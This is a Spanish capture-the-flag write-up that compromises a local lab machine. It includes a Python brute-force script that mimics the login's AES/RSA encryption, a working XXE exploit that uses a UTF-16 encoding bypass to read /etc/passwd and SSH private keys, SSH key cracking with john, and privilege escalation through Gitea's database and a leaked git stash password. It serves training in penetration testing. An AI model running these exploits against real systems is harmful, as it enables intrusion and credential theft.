
-------------

Comenzamos con un reconocimiento para identificar la máquina víctima con ayuda de `arp-scan`:

```bash
arp-scan -I ens33 --localnet --ignoredups
```

![[Pasted image 20260325164654.png]]

Se observa que la máquina cuenta con la IP `192.168.1.128`.

Mediante el comando `ping` y su valor de `ttl` siempre y cuando este no se haya modificado puede darnos una pista del sistema que usa:

```bash
ping -c 1 192.168.1.128
```

![[Pasted image 20260325164851.png]]

Como podemos observar un `ttl=64` nos habla de un posible sistema Unix o basado en él.

Ya podemos comenzar con un escaneo de puertos mediante `nmap` primero para identificar puertos abiertos:

```bash
nmap -p- --open -sS --min-rate 5000 -n -v -Pn 192.168.1.128 -oG allPorts
```

![[Pasted image 20260325165055.png]]

Tenemos el puerto `22` y `80` abiertos así que con ayuda de `nmap` vamos a intentar obtener más información sobre ellos:

```bash
nmap -p22,80 -sVC 192.168.1.128 -oN target
```

![[Pasted image 20260325165331.png]]

Obtenemos nuevamente los servicios y su versión que son `ssh` y `http` corriendo.

Lo primero será identificar un poco más el puerto `80` con ayuda de `whatweb`:

```bash
whatweb http://192.168.1.128
```

![[Pasted image 20260325165541.png]]

Como observamos tenemos `apache v2.4.62` al parecer corre en un Debian pero es algo que no podemos asegurar y por el título al parecer es un login. Veámoslo en el navegador para tener algo mucho más visual:

![[Pasted image 20260325165729.png]]

Como observamos es un login y pues podemos intentar diferentes métodos de bypass pero de primeras no se logra nada desde la web.

Veamos cómo es que la petición se está tramitando con ayuda de Burp Suite.

La petición se tramitó con las credenciales `test` y `test`:

![[Pasted image 20260325170140.png]]

Pero si revisamos en el Burp Suite:

![[Pasted image 20260325170220.png]]

Es una estructura muy extraña la cual debe tener algún proceso de encriptación que lo deja de esa forma.

Si analizamos un poco el código fuente de la web vamos a encontrarnos con lo siguiente:

![[Pasted image 20260325170509.png]]

Como observamos tenemos un script de `login.js` el cual vamos a traernos a local para analizar su código:

```bash
curl http://192.168.1.128/login.js -o login.js
```

![[Pasted image 20260325170736.png]]

Con el archivo en local vamos a tratar de entender qué hace, se va a registrar lo más relevante del script.

![[Pasted image 20260325171014.png]]

Lo primero es la clave pública, esta puede estar siendo utilizada para algún tipo de autenticación o encriptación, luego observamos que dentro de la función se recuperan los valores de `username` y `password`.
 d
![[Pasted image 20260325171303.png]]

Aquí tenemos lo más importante de manera general lo que vemos es un cifrado híbrido donde:
- Primero generamos el `aeskey` y `iv` que serán para el cifrado simétrico o sea la llave y el ruido con el cual se mezclará para hacerlo dinámico evitando duplicados al hacerlo de forma múltiple.
- Lo siguiente es el cifrado simétrico utilizando las credenciales, el `aeskey` y también el `iv`  para por último dejarlo en base64.
- Ya lo último es el cifrado asimétrico donde tomamos tanto la `aeskey` ya en base64 y el  `iv` también en base64 y los ciframos de forma asimétrica con el objetivo de tramitarlo de forma segura.

![[Pasted image 20260325200724.png]]

También tenemos el cómo se tramitan las peticiones y es la estructura con la que nos encontramos en Burp Suite.

![[Pasted image 20260325200911.png]]

Por último vemos una ruta `/dashboard.html` y pues parece ser que necesita un `token` de sesión para entrar en la misma.

Con esto claro no veo forma de romper el cifrado pero y si intentamos ver si este login cuenta con algún límite de intentos:

![[Pasted image 20260325201225.png]]

Lo he intentado múltiples veces y pues no parece bloquearse.

Podríamos directamente intentar un ataque de fuerza bruta pero antes miremos la ruta de `dashboard.html`:

![[Pasted image 20260325201448.png]]

Por un momento algo diferente carga y luego nos envía de nuevo al login, vamos a intentarlo desde el Burp Suite para poder pausar esa carga:

![[Pasted image 20260325201630.png]]

Como observamos sí, al ingresar al `dashboard.html` parece ser que no verifica primero si el acceso es válido sino que devuelve primero el HTML y al terminar de cargarlo verifica el `token` que no existe y genera la redirección esto lo conocemos como un Broken Access Control.

Antes de analizar la web tenemos que entrar y bueno ahora si nos fijamos en la captura observamos un usuario `admin`, con el usuario y conociendo la lógica que utiliza la web podemos intentar un ataque de fuerza bruta, en este caso vamos a pasar esta lógica a python:

```python
#!/usb/bin/python3

import requests, signal, sys, json, base64, os
from pwn import *
from Crypto.Cipher import AES, PKCS1_v1_5
from Crypto.PublicKey import RSA
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes
from socks import ProxyConnectionError

def def_handler(sig, frame):
    print("\n[+] Saliendo .....\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

#global var
rsaPublicKey = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAt6l3k43vuI+8ODHhr07q
/fBswyWqv5d0SsoX2+i5rWy98PW58HNrKveU6IDRhWFOmA8MQ0j7zUcH33VGaQNO
ZdI8gmo4pdlABQJ7EM4E6KGYCxlyIi4QtyUorBP6pfS1nlLCyAIcybnpia4kHT/p
MqaIXKMVqDYHGJMNp0LIBkFA0eKp9usd2YStJ0nzgZrJS2t8znbvqXqx8uvBkRpZ
bEZKUc3skgUIumazaw4plE+OzcVAa/67vuD7e7sycVHY+McsphLm+1CjS1jjvBt6
z036X4WJUANNIb4K2yJ8tYREXbxLQ5uwnVb9cwbQKSGg8Tr6GgSkbNjseAgZaUPt
QwIDAQAB
-----END PUBLIC KEY-----"""

main_url = "http://192.168.1.128/api/login.php"
headers = {
    "Host": "192.168.1.128",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:148.0) Gecko/20100101 Firefox/148.0",
    "Accept-Language": "en-US,en;q=0.9",
    "Referer": "http://192.168.1.128/",
    "Content-Type": "application/json",
    "Origin": "http://192.168.1.128"
}

def dictionary(path):
    passwordList = []

    with open(path, "r") as file:
        for line in file:
            passwordList.append(line.strip())

    return passwordList

def encryptData(password):

    aeskey = get_random_bytes(16)
    iv = get_random_bytes(16)

    credentials = {"username": "admin", "password": password}
    dataString = json.dumps(credentials).encode("utf-8")
    cipher = AES.new(aeskey, AES.MODE_CBC, iv)

    paddedData = pad(dataString, AES.block_size, style="pkcs7")
    ciphertext = cipher.encrypt(paddedData)

    encryptDataBase64 = base64.b64encode(ciphertext).decode('utf-8')

    aesKeyb64 = base64.b64encode(aeskey).decode('utf-8')
    ivKeyb64 = base64.b64encode(iv).decode('utf-8')

    rsaKey = RSA.import_key(rsaPublicKey)
    cipherRSA = PKCS1_v1_5.new(rsaKey)

    encryptedKeyRSA = cipherRSA.encrypt(aesKeyb64.encode('utf-8'))
    encryptedivRSA = cipherRSA.encrypt(ivKeyb64.encode('utf-8'))

    finalEncryptedKey = base64.b64encode(encryptedKeyRSA).decode('utf-8')
    finalEncryptediv = base64.b64encode(encryptedivRSA).decode('utf-8')

    return [ encryptDataBase64, finalEncryptedKey, finalEncryptediv ]

def sendRequest(encryptDataBase64, finalEncryptedKey, finalEncryptediv):

    data = {
        "encryptedData":encryptDataBase64,
        "encryptedKey":finalEncryptedKey,
        "encryptedIv":finalEncryptediv
    }

    r = requests.post(main_url, headers=headers, data=json.dumps(data).encode('utf-8'))

    return r


def bruteForceAttack(path):

    dic = dictionary(path)

    p1 = log.progress("Status")
    p1.status("Start Attack")
    p2 = log.progress("Password")
    p2.status("......")

    time.sleep(3)

    for password in dic:
        time.sleep(0.25)
        data = encryptData(password)
        request = sendRequest(data[0],data[1],data[2])
        p1.status(request.status_code)
        p2.status(password)

        if request.status_code == 200:
            print("[+] Success")
            sys.exit(0)

if __name__ == '__main__':
    os.system("clear")
    print("\n\t Brute Force \n\n")
    bruteForceAttack(sys.argv[1])
```

Bueno el cómo funciona mi script es sencillo lo ejecutamos de la siguiente manera:

```bash
python3 bruteForce.py <dictionary>
```

Si el diccionario contiene la contraseña veremos lo siguiente:

![[Pasted image 20260326222106.png]]

La contraseña es `hotdog` para el usuario `admin`, con esto vamos a intentar ingresar:

![[Pasted image 20260326222252.png]]

Tenemos un panel donde al parecer el objetivo es subir archivos de tipo XML, en este caso vamos a subir uno de prueba solo para poder capturar la petición con ayuda de Burp Suite y analizarlo:

![[Pasted image 20260326223115.png]]

Se envía el contenido del archivo `test.xml` para posteriormente representarse en en la respuesta.

En este punto al ver que es un archivo `xml` y el cómo se tramita se intenta [[XML External Entity Injection|XXE Injection]]:

![[Pasted image 20260326225352.png]]

Vemos que no es autorizado y muchas de las formas usuales no funcionarán.

Algo que puede estar pasando en realidad es que el filtro que impide el uso de entidades está aplicado solo a `utf-8`, por lo tanto podemos intentar cambiarlo a `utf-16` para ver si es válido, para esto lo vamos a realizar desde python:

![[Pasted image 20260326231711.png]]

Comenzamos construyendo la petición de forma normal y valido que funciona.

![[Pasted image 20260326231844.png]]

Como observamos pasamos el formato a `utf-16` donde se tiene una respuesta normal así que intentamos el [[XML External Entity Injection|XXE Injection]]:

![[Pasted image 20260326232205.png]]

La inyección fue exitosa, a partir de allí se mejoró un poco el código quedando en su versión final para su uso:

```python
#!/usr/bin/python3

import requests, sys

main_url = "http://192.168.1.128/api/import.php"

headers = {
    "Host": "192.168.1.128",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:148.0) Gecko/20100101 Firefox/148.0",
}

cookies = {
    "PHPSESSID":"08jd80bikvbru3hfvd3pfjf6lr",
    "session_token":"fe44acaa0e421628a60c25ca4f96175e9fd1c91cc5dee37bcaa492e91b1b2687"
}

def request(input_file):

    try:
        content = f"""<?xml version="1.0" encoding="UTF-16"?>
<!DOCTYPE foo [<!ENTITY file SYSTEM "file://{input_file}">]>
<file>
        &file;
</file>
""".encode("utf-16")

        files = {
            'xmlFile': ('test.xml', content, "text/xml")
        }

        r = requests.post(main_url, headers=headers, cookies=cookies, files=files)

        data = r.json()
        print(f"\n{data['data'][0].strip()}")

    except:
        print("\n[!] Information not recovered\n")


if __name__ == '__main__':
    file = sys.argv[1]
    request(file)

```

Bueno el script es sencillo de usar y sería de la siguiente forma:

```bash
python3 xxeInjection.py /etc/passwd
```

![[Pasted image 20260327164935.png]]

Podemos ver archivos de la máquina, en este caso voy a intentar ver el contenido del archivo `/etc/passwd` para luego  filtrar el output por líneas donde terminen en `sh`, el objetivo es identificar potenciales usuarios:

```bash
python3 xxeInjection.py /etc/passwd | grep ".*sh$"
```

![[Pasted image 20260327165135.png]]

Podemos observar que son tres `root, git y bilir`, como tenemos el puerto 22 abierto lo siguiente que se me ocurre es buscar por posibles claves para intentar una conexión por ssh en los directorios de cada usuario, al no conocer el nombre de dicha llave se usarán los más comunes y los probaremos de la siguiente manera:

```bash
cat ssh-priv-key-loot-common.txt| while read line; do echo "name: ${line}"; python3 xxeInjection.py /home/bilir/.ssh/${line} | grep -v "not recovered"; done
```

![[Pasted image 20260327171608.png]]

Observamos como se prueba uno por uno varios nombres usuales al crear claves, en caso no logramos encontrar nada para el usuario `bilir` así que lo ejecutamos ahora para el usuario `git`:

![[Pasted image 20260327172008.png]]

Logramos obtener la clave privada del usuario `git`, podemos intentar almacenarla en un archivo y usarla para intentar una conexión:

```bash
ssh -i idrsa git@192.168.1.128
```

![[Pasted image 20260327172553.png]]

Algo extra es no olvidar la asignación del permiso `600` al archivo donde almacenamos la clave privada para que sea válido.

En este punto algo que podemos intentar es un ataque de fuerza bruta a la clave privada con el objetivo de intentar obtener la contraseña y lo realizaremos de la siguiente manera:

```bash
ssh2john idrsa > hash
```

![[Pasted image 20260327173634.png]]

Ya con esto creamos el archivo mediante el cual realizaremos el ataque de fuerza bruta, por lo tanto usando el diccionario de preferencia el comando sería el siguiente:

```bash
john --wordlist=/usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-1000000.txt hash
```

![[Pasted image 20260327173912.png]]

Como observamos obtuvimos la contraseña la cual es `logitech` con esto podemos intentar un inicio de sesión nuevamente:

```bash
ssh -i idrsa git@192.168.1.128
```

![[Pasted image 20260327174044.png]]

Ya estamos dentro.

![[Pasted image 20260329210332.png]]

Podemos ver que tenemos ya la flag de usuario.

Comenzamos con un reconocimiento en este caso de puertos internos abiertos:

```bash
ss -nltp
```

![[Pasted image 20260329210515.png]]

Como observamos tenemos el puerto `3000` abierto, lo que podemos hacer es exponerlo mediante la conexión `ssh` de la siguiente manera:

```bash
ssh -i idrsa git@192.168.1.128 -L 3000:127.0.0.1:3000
```

![[Pasted image 20260329211015.png]]

Si revisamos nuestros puertos abiertos vamos a ver que ya tenemos el puerto `3000` abierto:

![[Pasted image 20260329211127.png]]

Perfecto podemos realizar un pequeño escaneo con `nmap` sobre el puerto:

```bash
nmap -p3000 -sVC 127.0.0.1
```

![[Pasted image 20260329211357.png]]

Como observamos es un servicio `http` y por el título y la versión nos enteramos que es `gitea`.

Revisamos la web de forma manual con el objetivo de encontrar algo de información:

![[Pasted image 20260329211754.png]]

Podemos registrarnos en la web, así que vamos a hacerlo:

![[Pasted image 20260329212510.png]]

Ya estamos dentro así que seguiremos investigando.

![[Pasted image 20260329212835.png]]

Encontramos que root tiene una publicación pero de igual forma no logramos encontrar nada.

En este punto pasé de enumerar la web desde dentro ya que al final tenemos una conexión establecida.

Comenzamos identificando el directorio donde se almacena la configuración de la web:

```bash
ps -aux | grep gitea
```

![[Pasted image 20260329213207.png]]

Como observamos ya tenemos identificado el archivo de configuración que se usó para levantar la web, por lo tanto podemos ver su contenido:

![[Pasted image 20260329214021.png]]

Podemos observar lo que parece ser la ruta principal del proyecto por lo que vamos a acceder a la misma y veamos que es lo que tenemos:

![[Pasted image 20260329214208.png]]

Bueno encontramos algo que puede servir mucho y es lo que parece ser la base de datos de la web.

Revisando un poco logro observar cómo `sqlite3` está instalado por lo que vamos a usarlo con el archivo y vamos a intentar ver la información que contiene:

```bash
sqlite3 gitea.db
```

![[Pasted image 20260330203938.png]]

Bueno listemos las tablas:

```sqlite
.tables
```

![[Pasted image 20260330204224.png]]

Nos centraremos en la tabla `user`, primero activaremos los headers para saber qué pertenece a qué y luego listemos su información:

```sqlite
.headers on
select * from user;
```

![[Pasted image 20260330204838.png]]

Tenemos 3 items y esto lo digo centrándome en el `id` además limitaremos la información solo a `id,name,is_admin`:

```sqlite
select id, name, is_admin from user;
```

![[Pasted image 20260330205130.png]]

Tenemos valores de 1 y 0 para definir si un usuario es administrador o no por lo tanto qué tal si cambiamos a mi usuario `stark` como administrador para tener mayores permisos en la web:

```sqlite
update user set is_admin=1 where id=3;
```

![[Pasted image 20260330205532.png]]

Con esto procedamos a ver si en la web cambió algo:

![[Pasted image 20260330205650.png]]

Algo interesante es que en el repositorio de `root` podemos ver su configuración, veamos si encontramos algo de utilidad:

![[Pasted image 20260330210021.png]]

Como observamos tenemos una cabecera de autorización `bearer`  y el valor que parece estar en base64, vamos a intentar ver su contenido decodificado:

```bash
echo "YmlsaXIhQCM=" | base64 -d; echo
```

![[Pasted image 20260330210145.png]]

Bueno una posible contraseña, vamos a intentar usarla:

![[Pasted image 20260330210309.png]]

Con esto actualmente estamos como el usuario `bilir`, por lo tanto vamos a realizar reconocimiento nuevamente:

![[Pasted image 20260330210454.png]]

En  su directorio home encontramos una carpeta code, vemos su interior:

![[Pasted image 20260330210552.png]]

Como observamos tenemos algunos archivos pero el directorio tiene un registro con git por lo tanto vamos a hacer algo de reconocimiento para intentar identificar u obtener algo más de información:

![[Pasted image 20260330210749.png]]

Como observamos tenemos un registro temporal de `stash` recordemos que es un espacio que almacena cambios sin necesidad de un commit, vemos cuáles son estos cambios:

![[Pasted image 20260330211038.png]]

En este caso contenía una contraseña la cual podemos intentar usar para root a ver si es válida:

![[Pasted image 20260330211140.png]]

Ya nos encontramos como root y tenemos la última flag:

![[Pasted image 20260330211214.png]]

![[Pasted image 20260330211635.png]]

Laboratorio Terminado.

## Mitigaciones

